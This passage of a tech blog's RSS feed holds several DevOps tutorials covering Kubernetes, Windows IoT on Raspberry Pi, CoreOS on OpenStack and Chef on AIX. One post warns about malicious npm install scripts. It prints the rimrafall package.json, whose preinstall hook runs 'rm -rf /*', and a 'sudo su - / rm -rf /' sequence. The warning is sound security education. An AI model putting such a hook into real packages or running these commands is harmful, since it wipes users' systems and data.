&lt;span class=&quot;attr&quot;&gt;      protocol:&lt;/span&gt; TCP
  &lt;span class=&quot;comment&quot;&gt;# public ip of minion, only required for vagrant&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# just like the selector in the replication controller,&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# but this time it identifies the set of pods to load balance&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# traffic to.&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  selector:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    name:&lt;/span&gt; nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Add public endpoint&lt;/span&gt;
$ kubectl create &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; 01-nginx-service.yaml
services/nginx-endpoint

&lt;span class=&quot;comment&quot;&gt;# Show all running endpoints&lt;/span&gt;
$ kubectl get services &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt; name=www-nginx 
NAME             LABELS           SELECTOR     IP(S)           PORT(S)
nginx-endpoint   name=www-nginx   name=nginx   10.247.212.62   8000/TCP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we set up a HTTP Health Checks that will restart a the nginx container in case the application crashes.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-yaml&quot;&gt;&lt;span class=&quot;attr&quot;&gt;apiVersion:&lt;/span&gt; v1beta3
&lt;span class=&quot;attr&quot;&gt;kind:&lt;/span&gt; Pod
&lt;span class=&quot;attr&quot;&gt;metadata:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  name:&lt;/span&gt; nginx-healthcheck
&lt;span class=&quot;attr&quot;&gt;  labels:&lt;/span&gt; 
&lt;span class=&quot;attr&quot;&gt;    name:&lt;/span&gt; www-nginx
&lt;span class=&quot;attr&quot;&gt;spec:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  containers:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    - name:&lt;/span&gt; nginx
&lt;span class=&quot;attr&quot;&gt;      image:&lt;/span&gt; nginx
      &lt;span class=&quot;comment&quot;&gt;# defines the health checking&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;      livenessProbe:&lt;/span&gt;
        &lt;span class=&quot;comment&quot;&gt;# an http probe&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        httpGet:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;          path:&lt;/span&gt; /_status/healthz
&lt;span class=&quot;attr&quot;&gt;          port:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;
        &lt;span class=&quot;comment&quot;&gt;# length of time to wait for a pod to initialize&lt;/span&gt;
        &lt;span class=&quot;comment&quot;&gt;# after pod startup, before applying health checking&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        initialDelaySeconds:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        timeoutSeconds:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;      ports:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;        - containerPort:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Add the health check to your cluster&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# add a health check&lt;/span&gt;
kubectl create &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; 01-nginx-health-check.yaml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Everything is setup properly. To destory the cluster, delete all definitions from kubernetes:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Delete all added parts
$ kubectl delete -f 01-nginx-service.yaml 
$ kubectl delete -f 01-nginx.yaml
$ kubectl delete -f 01-nginx-health-check.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Have fun with containers!&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Install Windows IoT on Raspberry Pi 2</title>
      <link>http://lollyrock.com/articles/windows-iot-raspberry/</link>
      <pubDate>Sat, 09 May 2015 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/windows-iot-raspberry/</guid>
      <author></author>
      <description>&lt;p&gt;Recently, Microsoft announced its &lt;a href=&quot;http://ms-iot.github.io/content/GetStarted.htm&quot;&gt;Windows 10 IoT Core Insider Preview&lt;/a&gt; and it is very exiting to get an ARM version of Windows running on a small device. Microsoft did a great job to bring the operating system to smaller devices and I am looking forward to play more with their IoT solutions. Now, lets install Windows on Raspberry 2.&lt;/p&gt;
&lt;h2 id=&quot;download-windows-10-iot&quot;&gt;Download Windows 10 IoT&lt;/h2&gt;
&lt;p&gt;Create an account at &lt;a href=&quot;https://connect.microsoft.com/windowsembeddediot/SelfNomination.aspx?ProgramID=8558&quot;&gt;Microsoft Connect&lt;/a&gt; and download the image &lt;a href=&quot;http://connect.microsoft.com/windowsembeddedIoT/Downloads/&quot;&gt;Windows_IoT_Core_RPI2_BUILD.zip&lt;/a&gt;. You need to sign their &lt;code&gt;Windows Developer Program For IoT EULA&lt;/code&gt; and &lt;code&gt;Windows 10 IoT Core Insider Preview EULA&lt;/code&gt; located in their &lt;a href=&quot;https://connect.microsoft.com/windowsembeddedIoT/Surveys&quot;&gt;survey&lt;/a&gt; section.&lt;/p&gt;
&lt;p&gt;The downloaded &lt;code&gt;Windows_IoT_Core_RPI2_BUILD.zip&lt;/code&gt; contains the required &lt;code&gt;Flash.ffu&lt;/code&gt;. Extract the zip file and you are ready for SD card preparation.&lt;/p&gt;
&lt;h2 id=&quot;prepare-sd-card&quot;&gt;Prepare SD Card&lt;/h2&gt;
&lt;p&gt;We will use Windows 10 for SD card preparation. Currently, I found no easy way to build an image (eg. with &lt;code&gt;dd&lt;/code&gt;) on Linux or Mac. I recommend to use Windows 10 as a host operating system. I just deployed it on a new machine to play around with Windows 10 and Windows 10 IoT.&lt;/p&gt;
&lt;p&gt;Now, insert a blank 8GB Class 10 SD card into your computer and find your SD card with &lt;code&gt;diskpart&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&amp;gt; diskpart

Microsoft DiskPart version 10.0.10074

Copyright (C) 1999-2013 Microsoft Corporation.
On computer: WIN-7ECOKTDG4QV

DISKPART&amp;gt; list disk

  Disk &lt;span class=&quot;comment&quot;&gt;###  Status         Size     Free     Dyn  Gpt&lt;/span&gt;
  --------  -------------  -------  -------  ---  ---
  Disk 0    Online          232 GB      0 B
  Disk 1    Online           59 GB      0 B        *

DISKPART&amp;gt; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;

Leaving DiskPart...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In case you do not like to command line, you could also use the graphical &lt;code&gt;Disk Management&lt;/code&gt; tool. &lt;/p&gt;
&lt;p&gt;With help of &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/dd371719%28v=vs.85%29.aspx&quot;&gt;Microsofts Dsim&lt;/a&gt; tool, we create the image for our Raspberry 2. Be aware that you need to replace &lt;code&gt;PhysicalDriveN&lt;/code&gt; with your local disk id like &lt;code&gt;PhysicalDrive1&lt;/code&gt;: &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\Users\chris\Downloads\Windows_IoT_Core_RPI2_BUILD&amp;gt; dism.exe /Apply-Image 
/ImageFile:Flash.ffu /ApplyDrive:\\.\PhysicalDriveN /SkipPlatformCheck

Deployment Image Servicing and Management tool
Version: 10.0.10074.0

Applying image
[==========================100.0%==========================]
The operation completed successfully.
PS C:\Users\chris\Downloads\Windows_IoT_Core_RPI2_BUILD&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In case you receive an IO error, you may need to switch the physical knob to active writing for your SD card.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;PS C:\Windows\system32&amp;gt; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;'C:\Users\chris\Downloads\Windows_IoT_Core_RPI2_BUILD\'&lt;/span&gt;
PS C:\Users\chris\Downloads\Windows_IoT_Core_RPI2_BUILD&amp;gt; dism.exe /Apply-Image 
/ImageFile:Flash.ffu /ApplyDrive:\\.\PhysicalDriveN /SkipPlatformCheck

Deployment Image Servicing and Management tool
Version: 10.0.10074.0

Applying image
[==========================100.0%==========================]

Error: 1117

The request could not be performed because of an I/O device error.

The DISM &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; file can be found at C:\Windows\Logs\DISM\dism.log
PS C:\Users\chris\Downloads\Windows_IoT_Core_RPI2_BUILD&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally, remove your SD card from your computer.&lt;/p&gt;
&lt;h2 id=&quot;boot-in-your-raspberry-pi-2&quot;&gt;Boot in Your Raspberry Pi 2&lt;/h2&gt;
&lt;p&gt;Once everything is ready, boot your Raspberry Pi 2 and wait some minutes. Windows will boot and display a overview screen that displays all required information to connect to the device.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/windows-iot-raspberry/boot_01.png&quot; alt=&quot;Windows IoT Raspberry 2 Boot&quot; title=&quot;Windows IoT Raspberry 2 Boot&quot;&gt;
&lt;img src=&quot;/articles/windows-iot-raspberry/boot_02.png&quot; alt=&quot;Windows IoT Raspberry 2 Boot&quot; title=&quot;Windows IoT Raspberry 2 Boot&quot;&gt;
&lt;img src=&quot;/articles/windows-iot-raspberry/boot_03.png&quot; alt=&quot;Windows IoT Raspberry 2 Boot&quot; title=&quot;Windows IoT Raspberry 2 Boot&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;web-administration&quot;&gt;Web Administration&lt;/h2&gt;
&lt;p&gt;By default, Windows IoT ships with an Web Administration interface that is available by entering the ip address of the Raspberry Pi. It displays the installed apps, running processes, current performence and debugging information.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/windows-iot-raspberry/04.png&quot; alt=&quot;Windows IoT Web Administration    &quot; title=&quot;Windows IoT Web Administration&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;install-visual-studio&quot;&gt;Install Visual Studio&lt;/h2&gt;
&lt;p&gt;To start developing for Windows IoT, &lt;a href=&quot;https://www.visualstudio.com/en-us/downloads/visual-studio-2015-downloads-vs.aspx&quot;&gt;download the Visual Studio Community Edition&lt;/a&gt; and installa the &lt;code&gt;Windows Developer Program for IoT Installation&lt;/code&gt; that is included in &lt;code&gt;Windows_IoT_Core_RPI2_BUILD.zip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/windows-iot-raspberry/03.png&quot; alt=&quot;Download Visual Studio 2015&quot; title=&quot;Visual Studio 2015 download&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/windows-iot-raspberry/01.png&quot; alt=&quot;Install Visual Studio 2015&quot; title=&quot;Visual Studio 2015 Installation&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/windows-iot-raspberry/02.png&quot; alt=&quot;Install Windows Developer Program for IoT&quot; title=&quot;Windows Developer Program for IoT Installation&quot;&gt;&lt;/p&gt;
&lt;p&gt;I am looking forward to play more with Windows IoT and start deploying universal apps.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>npm install - could be dangerous</title>
      <link>http://lollyrock.com/articles/npm-dependency-could-be-dangerous/</link>
      <pubDate>Fri, 08 May 2015 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/npm-dependency-could-be-dangerous/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/&quot;&gt;NPM&lt;/a&gt; hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?&lt;/p&gt;
&lt;h2 id=&quot;what-is-going-on-&quot;&gt;What is going on?&lt;/h2&gt;
&lt;p&gt;Just recently, &lt;a href=&quot;https://github.com/joaojeronimo&quot;&gt;João Jerónimo&lt;/a&gt; published a special npm modules called &lt;a href=&quot;https://github.com/joaojeronimo/rimrafall&quot;&gt;rimrafall&lt;/a&gt;. He published it at npm and posted it on &lt;a href=&quot;https://news.ycombinator.com/item?id=8947493&quot;&gt;Hacker News&lt;/a&gt;. Essentially this module does the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo su -
rm -rf /
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It uses a special script tag in &lt;code&gt;package.json&lt;/code&gt; to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.&lt;/p&gt;
&lt;p&gt;The package.json looks as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
  &amp;quot;name&amp;quot;: &amp;quot;rimrafall&amp;quot;,
  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
  &amp;quot;description&amp;quot;: &amp;quot;rm -rf /* # DO NOT INSTALL THIS&amp;quot;,
  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
  &amp;quot;scripts&amp;quot;: {
    &amp;quot;preinstall&amp;quot;: &amp;quot;rm -rf /*&amp;quot;
  },
  &amp;quot;keywords&amp;quot;: [
    &amp;quot;rimraf&amp;quot;,
    &amp;quot;rmrf&amp;quot;
  ],
  &amp;quot;author&amp;quot;: &amp;quot;João Jerónimo&amp;quot;,
  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;risk&quot;&gt;Risk&lt;/h2&gt;
&lt;p&gt;Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or CI server.&lt;/p&gt;
&lt;p&gt;Although there is no easy mitigation, you could start building all your node code in a Docker container or use &lt;code&gt;npm install --ignore-scripts&lt;/code&gt;. If you integrate 3rd-party modules, have a look at their source code, especially if it is a new module.&lt;/p&gt;
&lt;p&gt;See also:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-encryption/&quot;&gt;Encrypt and decrypt content with Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-sha512/&quot;&gt;SHA 512 Hashs with nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/express4-file-upload/&quot;&gt;Simple file uploads with Express 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/content-security-policy/&quot;&gt;Applied Content Security Policy for Nginx and Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://arlimus.github.io/articles/ready.for.es6/&quot;&gt;Ready for ES6?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Run CoreOS on OpenStack</title>
      <link>http://lollyrock.com/articles/coreos-openstack/</link>
      <pubDate>Mon, 27 Apr 2015 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/coreos-openstack/</guid>
      <author></author>
      <description>&lt;p&gt;This guide will walk you through downloading CoreOS for OpenStack, importing in OpenStack  with &lt;code&gt;glance&lt;/code&gt; and start your first CoreOS cluster with the &lt;code&gt;nova&lt;/code&gt; tool.&lt;/p&gt;
&lt;h2 id=&quot;upload-the-image&quot;&gt;Upload the Image&lt;/h2&gt;
&lt;p&gt;Personally, I use the &lt;a href=&quot;https://github.com/chris-rock/openstack-cli&quot;&gt;OpenStack Docker CLI image&lt;/a&gt;, that provides the nova and glance tool and is &lt;a href=&quot;http://lollyrock.com/articles/openstack-cli-docker/&quot;&gt;described here&lt;/a&gt;. Once you are able to connect to OpenStack, you need to download the CoreOS image and bunzip it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# download stable channel&lt;/span&gt;
$ wget http://stable.release.core-os.net/amd64-usr/current/coreos_production_openstack_image.img.bz2
&lt;span class=&quot;comment&quot;&gt;# extract image&lt;/span&gt;
$ bunzip2 coreos_production_openstack_image.img.bz2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, upload the CoreOS image via glance:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ glance image-create --name CoreOS \
  --container-format bare \
  --disk-format qcow2 \
  --progress \
  --file coreos_production_openstack_image.img \
  --is-public True
+------------------+--------------------------------------+
| Property         | Value                                |
+------------------+--------------------------------------+
| checksum         | ed8eef431a77f11c3bea501574c590fe     |
| container_format | bare                                 |
| created_at       | 2015-04-22T13:24:42                  |
| deleted          | False                                |
| deleted_at       | None                                 |
| disk_format      | qcow2                                |
| id               | 5f6add97-7f21-407b-8f17-c887603efacb |
| is_public        | True                                 |
| min_disk         | 0                                    |
| min_ram          | 0                                    |
| name             | CoreOS                               |
| owner            | eef34004eb0f4f5ca722a29efd292d70     |
| protected        | False                                |
| size             | 420413440                            |
| status           | active                               |
| updated_at       | 2015-04-22T13:31:49                  |
| virtual_size     | None                                 |
+------------------+--------------------------------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;verify-your-image&quot;&gt;Verify your image&lt;/h2&gt;
&lt;p&gt;Verify that your newly uploaded image is available in glance.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ glance image-list
+--------------------------------------+---------------------------------+-------------+------------------+-------------+--------+
| ID                                   | Name                            | Disk Format | Container Format | Size        | Status |
+--------------------------------------+---------------------------------+-------------+------------------+-------------+--------+
| 5f6add97-7f21-407b-8f17-c887603efacb | CoreOS                          | qcow2       | bare             | 420413440   | active |
+--------------------------------------+---------------------------------+-------------+------------------+-------------+--------+
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;retrieve-a-new-discovery-token-for-the-coreos-cluster&quot;&gt;Retrieve a new discovery token for the CoreOS cluster&lt;/h2&gt;
&lt;p&gt;This guide used the etcd instance provided by CoreOS to manage the cluster. This eases the quickstart of a CoreOS cluster. Request a new cluster token via:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl -w &amp;quot;\n&amp;quot; &amp;#39;https://discovery.etcd.io/new?size=3&amp;#39;
https://discovery.etcd.io/24a9bafd557e8c45f89f547de6564ae5
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;create-a-cloud-config-file&quot;&gt;Create a cloud config file&lt;/h2&gt;
&lt;p&gt;Create a local &lt;code&gt;cloud-config.yaml&lt;/code&gt; and replace the &lt;code&gt;https://discovery.etcd.io/&amp;lt;token&amp;gt;&lt;/code&gt; with your discovery url like ‘&lt;a href=&quot;https://discovery.etcd.io/24a9bafd557e8c45f89f547de6564ae5&quot;&gt;https://discovery.etcd.io/24a9bafd557e8c45f89f547de6564ae5&lt;/a&gt;‘&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-yaml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#cloud-config&lt;/span&gt;

&lt;span class=&quot;attr&quot;&gt;coreos:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  etcd:&lt;/span&gt;
    &lt;span class=&quot;comment&quot;&gt;# generate a new token for each unique cluster from https://discovery.etcd.io/new?size=3&lt;/span&gt;
    &lt;span class=&quot;comment&quot;&gt;# specify the intial size of your cluster with ?size=X&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    discovery:&lt;/span&gt; https://discovery.etcd.io/&amp;lt;token&lt;span class=&quot;string&quot;&gt;&amp;gt;
    # multi-region and multi-cloud deployments need to use $public_ipv4
&lt;/span&gt;&lt;span class=&quot;attr&quot;&gt;    addr:&lt;/span&gt; $private_ipv4:&lt;span class=&quot;number&quot;&gt;4001&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    peer-addr:&lt;/span&gt; $private_ipv4:&lt;span class=&quot;number&quot;&gt;7001&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;  units:&lt;/span&gt;
&lt;span class=&quot;attr&quot;&gt;    - name:&lt;/span&gt; etcd.service
&lt;span class=&quot;attr&quot;&gt;      command:&lt;/span&gt; start
&lt;span class=&quot;attr&quot;&gt;    - name:&lt;/span&gt; fleet.service
&lt;span class=&quot;attr&quot;&gt;      command:&lt;/span&gt; start
&lt;span class=&quot;attr&quot;&gt;ssh_authorized_keys:&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# include one or more SSH public keys&lt;/span&gt;
&lt;span class=&quot;bullet&quot;&gt;  -&lt;/span&gt; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0g+ZTxC7weoIJLUafOgrm+h...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;More detailed configuration options are available at &lt;a href=&quot;https://coreos.com/docs/cluster-management/setup/cloudinit-cloud-config/&quot;&gt;CoreOS Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;create-a-new-coreos-cluster&quot;&gt;Create a new CoreOS cluster&lt;/h2&gt;
&lt;p&gt;With the cloud-init file ready, we start a 3-instance cluster via &lt;code&gt;nova&lt;/code&gt;. You may need to adapt the the flavor or security group names for your setup.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nova boot \
--user-data ./cloud-config.yaml \
--image CoreOS \
--key-name coreos \
--flavor m1.medium \
--num-instances 3 \
--security-groups default coreos
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After a successful run, all three instances are ready in OpenStack.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nova list
+--------------------------------------+---------------------------------------------+--------+------------+-------------+-------------------------------------+
| ID                                   | Name                                        | Status | Task State | Power State | Networks                            |
+--------------------------------------+---------------------------------------------+--------+------------+-------------+-------------------------------------+
| 2ed7d9ac-0449-4841-a780-cf9131740475 | coreos-2ed7d9ac-0449-4841-a780-cf9131740475 | ACTIVE | -          | Running     | default=192.168.0.12                |
| b919702e-be2f-4fcb-96c2-88fe9d14d320 | coreos-b919702e-be2f-4fcb-96c2-88fe9d14d320 | ACTIVE | -          | Running     | default=192.168.0.11                |
| c65cf227-05e3-46e6-9f11-a16ee6f13f4d | coreos-c65cf227-05e3-46e6-9f11-a16ee6f13f4d | ACTIVE | -          | Running     | default=192.168.0.13, 185.27.183.99 |
+--------------------------------------+---------------------------------------------+--------+------------+-------------+-------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;verify-the-coreos-cluster-is-registered-in-fleet&quot;&gt;Verify the CoreOS cluster is registered in fleet&lt;/h2&gt;
&lt;p&gt;SSH into CoreOS:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh core@185.27.183.99
Last login: Wed Apr 22 14:03:50 2015 from 217.247.74.212
CoreOS stable (633.1.0)
core@coreos-c65cf227-05e3-46e6-9f11-a16ee6f13f4d ~ $
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and verify that all nodes are registered properly in fleet:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;core@coreos-c65cf227-05e3-46e6-9f11-a16ee6f13f4d ~ $ fleetctl list-machines
MACHINE     IP      METADATA
2ed7d9ac... 192.168.0.12    -
b919702e... 192.168.0.11    -
c65cf227... 192.168.0.13    -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now you have a running CoreOS Cluster on OpenStack.&lt;/p&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://coreos.com/docs/running-coreos/platforms/openstack/&quot;&gt;https://coreos.com/docs/running-coreos/platforms/openstack/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>OpenStack CLI in Docker</title>
      <link>http://lollyrock.com/articles/openstack-cli-docker/</link>
      <pubDate>Tue, 21 Apr 2015 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/openstack-cli-docker/</guid>
      <author></author>
      <description>&lt;p&gt;Recently, I faced the issue, that I had some python modules for OpenStack had dependency issues with other python modules. In addition I use multiple machines with the OpenStack CLI and it is always a lot of effort to synchronize the software to the latest state. I could have used virtualenv, but I had issues with this setup, too. Therefore I decided to start implementing a Docker container.&lt;/p&gt;
&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
&lt;p&gt;The container handles all of the pain. It uses Ubuntu Trusty as a basis and uses their pre-packaged version of the OpenStack CLI tools. To get the cli installed, you need only &lt;a href=&quot;https://docs.docker.com/installation/&quot;&gt;Docker&lt;/a&gt; as precondition. On Mac I recommend using &lt;a href=&quot;http://lollyrock.com/articles/openstack-cli-docker/&quot;&gt;Boot2Docker&lt;/a&gt;. Now, everything is in place:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;docker pull chrisrock/openstack-cli
docker run -it -v $(&lt;span class=&quot;built_in&quot;&gt;pwd&lt;/span&gt;)/config:/config chrisrock/openstack-cli /bin/bash
$ &lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; /config/example.rc
$ nova list
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I collect my &lt;code&gt;.rc&lt;/code&gt; files in a separate config folder. By using &lt;code&gt;$(pwd)/config&lt;/code&gt;, I have all my configs ready in my container. &lt;code&gt;source /config/example.rc&lt;/code&gt; loads the config file. Finally all OpenStack CLI tools are at your hand.&lt;/p&gt;
&lt;p&gt;Have fun.&lt;/p&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/chris-rock/openstack-cli&quot;&gt;https://github.com/chris-rock/openstack-cli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://registry.hub.docker.com/u/chrisrock/openstack-cli/&quot;&gt;https://registry.hub.docker.com/u/chrisrock/openstack-cli/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Managing your mainframe infrastructure using Chef</title>
      <link>http://lollyrock.com/articles/managing-mainframe-using-chef/</link>
      <pubDate>Wed, 21 Jan 2015 18:00:00 -0600</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/managing-mainframe-using-chef/</guid>
      <author></author>
      <description>&lt;p&gt;This blog post will focus on running Chef cookbooks on AIX server. As an example we will install various Linux tools via Chef and demonstrate, how a mainframe setup can be automated.&lt;/p&gt;
&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Recently, I published an article about running &lt;a href=&quot;http://lollyrock.com/articles/ibm-aix-chef/&quot;&gt;Chef on AIX&lt;/a&gt;. I worked the last months with Chef and AIX. For my evaluations I used the &lt;a href=&quot;http://www.ibm.com/partnerworld/pdp&quot;&gt;IBM Power Development Cloud&lt;/a&gt;. Using various AIX machines, I needed a setup, where I was able to turn a vanilla AIX system into an perfectly configured system. One part of this setup was the installation of Linux tools to work faster via command line. IBM provides pre-compiled &lt;a href=&quot;http://www-03.ibm.com/systems/power/software/aix/linux/&quot;&gt;Linux tools for AIX&lt;/a&gt;. Since AIX lacks a package manager for rpm packages, the standard method was to run bash scripts that include the dependency graph. In the following sections, I’m going to install basic packages like wget, curl and zip via Chef and manually. &lt;/p&gt;
&lt;h2 id=&quot;the-chef-way&quot;&gt;The Chef way&lt;/h2&gt;
&lt;p&gt;As a first step we need to install the Chef client. The best way is via the standard install script provided at &lt;code&gt;https://www.chef.io/download-chef-client/&lt;/code&gt;. Since the current fix by &lt;a href=&quot;https://github.com/opscode/opscode-omnitruck/pull/72&quot;&gt;Julian Dunn&lt;/a&gt; for AIX is not yet live, you can use this &lt;a href=&quot;http://lollyrock.com/articles/managing-mainframe-using-chef/install.sh&quot;&gt;script&lt;/a&gt; instead. I do the following steps to run the script the first time: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open Terminal&lt;/li&gt;
&lt;li&gt;Copy content of install.sh into clipboard&lt;/li&gt;
&lt;li&gt;cat &amp;gt; install.sh, paste content, CTRL-C&lt;/li&gt;
&lt;li&gt;sh install.sh&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After running the script, Chef is installed on your machine. Tip: For production use, you can host the Chef client binaries on your own server and change the script with the required download urls.&lt;/p&gt;
&lt;p&gt;The next step is to transfer the cookbooks on your machine. In production environment you could easily copy the cookbooks from a NFS volume for Chef-Solo or use a Chef Server (recommended way).&lt;/p&gt;
&lt;p&gt;I wrote a &lt;a href=&quot;https://github.com/chris-rock/aix-base-setup&quot;&gt;AIX setup cookbook&lt;/a&gt; that offers chef recipes for installing wget, curl, vim, zip and tar. The &lt;a href=&quot;https://github.com/chris-rock/aix-base-setup/blob/master/recipes/vim.rb&quot;&gt;recipe for vim&lt;/a&gt; looks like:&lt;/p&gt;
